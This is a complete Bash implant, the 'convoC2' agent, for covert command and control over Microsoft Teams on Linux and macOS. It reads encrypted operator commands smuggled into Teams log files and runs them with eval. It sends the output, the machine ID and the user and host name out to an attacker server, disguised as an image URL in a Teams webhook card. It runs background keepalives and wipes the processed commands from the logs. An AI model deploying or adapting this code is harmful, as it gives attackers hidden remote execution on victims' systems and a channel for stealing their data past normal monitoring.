#!/bin/bash
# ConvoC2 Bash Agent 
# This is a Unix/Linux implementation of the convoC2 agent
# It monitors Microsoft Teams logs on Unix-based systems and executes commands

# Default values
TIMEOUT=1
VERBOSE=false
ENCRYPTION_KEY="convoC2-default-key-change-me-now!!"
REGEX_PATTERN='<span[^>]*aria-label="([^"]*)"[^>]*></span>'

# Parse command-line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        -s|--server)
            SERVER_URL="$2"
            shift 2
            ;;
        -w|--webhook)
            WEBHOOK_URL="$2"
            shift 2
            ;;
        -t|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift 1
            ;;
        -k|--key)
            ENCRYPTION_KEY="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [options]"
            echo "Options:"
            echo "  -s, --server URL    C2 server URL (required)"
            echo "  -w, --webhook URL   Teams webhook URL (required)"
            echo "  -t, --timeout SEC   Polling timeout in seconds (default: 1)"
            echo "  -v, --verbose       Enable verbose output"
            echo "  -k, --key KEY       Encryption key"
            echo "  -h, --help          Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use -h or --help for usage information"
            exit 1
            ;;
    esac
done

# Check required parameters
if [ -z "$SERVER_URL" ]; then
    echo "Error: Server URL is required"
    exit 1
fi

if [ -z "$WEBHOOK_URL" ]; then
    echo "Error: Webhook URL is required"
    exit 1
fi

# Utility functions
log() {
    if [ "$VERBOSE" = true ]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
    fi
}

# Helper function to generate a random string
random_string() {
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1
}

# Generate agent ID (machine ID + random component for uniqueness)
get_agent_id() {
    if [ -f /etc/machine-id ]; then
        MACHINE_ID=$(cat /etc/machine-id)
    elif [ -f /var/lib/dbus/machine-id ]; then
        MACHINE_ID=$(cat /var/lib/dbus/machine-id)
    else
        MACHINE_ID=$(hostname)
    fi
    echo "${MACHINE_ID}-$(random_string)"
}

# Get current username
get_current_user() {
    echo "$(whoami)@$(hostname)"
}

# Encryption functions using OpenSSL
encrypt() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -pbkdf2 -iter 100000 -salt -pass pass:"$ENCRYPTION_KEY"
}

decrypt() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 100000 -salt -pass pass:"$ENCRYPTION_KEY"
}

# Find Microsoft Teams log directory
find_teams_log_dir() {
    # Check for common Teams log locations
    local HOME_DIR="$HOME"
    
    # Look for new Teams client locations
    local LOCATIONS=(
        "$HOME_DIR/.config/Microsoft/Microsoft Teams/logs"
        "$HOME_DIR/Library/Application Support/Microsoft/Teams/logs"
        "$HOME_DIR/.config/Microsoft Teams/logs"
    )
    
    for location in "${LOCATIONS[@]}"; do
        if [ -d "$location" ]; then
            echo "$location"
            return 0
        fi
    done
    
    # If we get here, we couldn't find the logs
    log "Cannot find Microsoft Teams log directory"
    return 1
}

# Find Teams log files
find_teams_log_files() {
    local LOG_DIR="$1"
    
    # Look for logs.txt and any other log files
    find "$LOG_DIR" -name "logs.txt" -o -name "*-log.txt" 2>/dev/null
}

# Extract command from log file content
extract_command() {
    local LOG_CONTENT="$1"
    local COMMAND=$(echo "$LOG_CONTENT" | grep -Eo "$REGEX_PATTERN" | sed -E "s/$REGEX_PATTERN/\1/" | head -1)
    echo "$COMMAND"
}

# Execute command and get output
execute_command() {
    local COMMAND="$1"
    local OUTPUT
    local SUCCESS=true
    
    OUTPUT=$(eval "$COMMAND" 2>&1) || SUCCESS=false
    
    # Prepare JSON response
    local JSON="{\"command\":\"$COMMAND\",\"output\":\"$(echo "$OUTPUT" | sed 's/"/\\"/g' | tr '\n' ' ')\",\"success\":$SUCCESS}"
    echo "$JSON"
}

# Send data to server via webhook
send_to_server() {
    local ENDPOINT="$1"
    local PAYLOAD="$2"
    
    # Base64 encode the payload
    local ENCODED=$(echo -n "$PAYLOAD" | base64 | tr -d '\n')
    local FULL_URL="${SERVER_URL}${ENDPOINT}/${ENCODED}"
    
    # Create Teams adaptive card JSON
    local BODY=$(cat <<EOF
{
    "type": "message",
    "attachments": [
        {
            "contentType": "application/vnd.microsoft.card.adaptive",
            "content": {
                "\$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
                "type": "AdaptiveCard",
                "version": "1.2",
                "body": [
                    {
                        "type": "TextBlock",
                        "text": "😈 ..convoC2 is cooking.. 😈",
                        "size": "Large",
                        "weight": "Bolder"
                    },
                    {
                        "type": "Image",
                        "url": "${FULL_URL}",
                        "size": "Small"
                    }
                ]
            }
        }
    ]
}
EOF
)
    
    # Send the webhook request
    curl -s -X POST -H "Content-Type: application/json" -d "$BODY" "$WEBHOOK_URL" > /dev/null
    return $?
}

# Notify server about new agent
notify_server() {
    local RANDOM_STR=$(random_string)
    local TIMESTAMP=$(date +%s)
    local PAYLOAD="{\"agentID\":\"$AGENT_ID\",\"username\":\"$USERNAME\",\"random\":\"$RANDOM_STR\",\"timestamp\":$TIMESTAMP}"
    
    send_to_server "hello" "$PAYLOAD"
    log "Notified server about new agent"
}

# Send keepalive to server
send_keepalive() {
    local RANDOM_STR=$(random_string)
    local TIMESTAMP=$(date +%s)
    local PAYLOAD="{\"agentID\":\"$AGENT_ID\",\"username\":\"$USERNAME\",\"random\":\"$RANDOM_STR\",\"timestamp\":$TIMESTAMP}"
    
    send_to_server "keepalive" "$PAYLOAD"
    log "Sent keepalive signal"
}

# Send command result to server
send_result() {
    local RESULT="$1"
    local RANDOM_STR=$(random_string)
    
    # Extract command output from JSON and add agent info
    local ENHANCED_RESULT=$(echo "$RESULT" | sed "s/}/,\"agentID\":\"$AGENT_ID\",\"username\":\"$USERNAME\",\"random\":\"$RANDOM_STR\"}/")
    
    send_to_server "command" "$ENHANCED_RESULT"
    log "Sent command result to server"
}

# Clean up old commands from log file
clean_old_commands() {
    local LOG_FILE="$1"
    
    # Only if file exists and is writable
    if [ -w "$LOG_FILE" ]; then
        # Replace span tags with nothing
        sed -i 's/<span[^>]*aria-label="[^"]*"[^>]*><\/span>//g' "$LOG_FILE" 2>/dev/null
        log "Cleaned up commands from $LOG_FILE"
    fi
}

# Initialize agent
AGENT_ID=$(get_agent_id)
USERNAME=$(get_current_user)

log "Agent initialized"
log "Agent ID: $AGENT_ID"
log "Username: $USERNAME"

# Find Teams log directory
LOG_DIR=$(find_teams_log_dir)
if [ -z "$LOG_DIR" ]; then
    echo "Error: Microsoft Teams log directory not found"
    exit 1
fi

log "Found Teams log directory: $LOG_DIR"

# Notify server about new agent
notify_server

log "Starting main loop"

# Start keepalive process in background
(
    while true; do
        send_keepalive
        sleep $((TIMEOUT * 10))
    done
) &
KEEPALIVE_PID=$!

# Cleanup function
cleanup() {
    log "Shutting down agent"
    [ -n "$KEEPALIVE_PID" ] && kill $KEEPALIVE_PID 2>/dev/null
    exit 0
}

# Set up signal handling
trap cleanup SIGINT SIGTERM

# Main loop
while true; do
    ENCRYPTED_COMMAND=""
    LOG_FILE_PATH=""
    
    # Get the list of log files
    LOG_FILES=$(find_teams_log_files "$LOG_DIR")
    
    # Check each log file for commands
    for log_file in $LOG_FILES; do
        if [ -r "$log_file" ]; then
            LOG_CONTENT=$(cat "$log_file" 2>/dev/null)
            ENCRYPTED_COMMAND=$(extract_command "$LOG_CONTENT")
            
            if [ -n "$ENCRYPTED_COMMAND" ]; then
                LOG_FILE_PATH="$log_file"
                break
            fi
        fi
    done
    
    if [ -n "$ENCRYPTED_COMMAND" ]; then
        # Try to decrypt the command
        COMMAND=""
        
        # Attempt decryption
        COMMAND=$(decrypt "$ENCRYPTED_COMMAND" 2>/dev/null)
        
        if [ -n "$COMMAND" ]; then
            log "Found command: $COMMAND"
            log "Executing command..."
            
            # Execute the command and get output
            RESULT=$(execute_command "$COMMAND")
            
            log "Sending result to server"
            send_result "$RESULT"
            
            # Clean up the processed command
            clean_old_commands "$LOG_FILE_PATH"
        else
            log "Failed to decrypt command"
        fi
    fi
    
    sleep $TIMEOUT
done 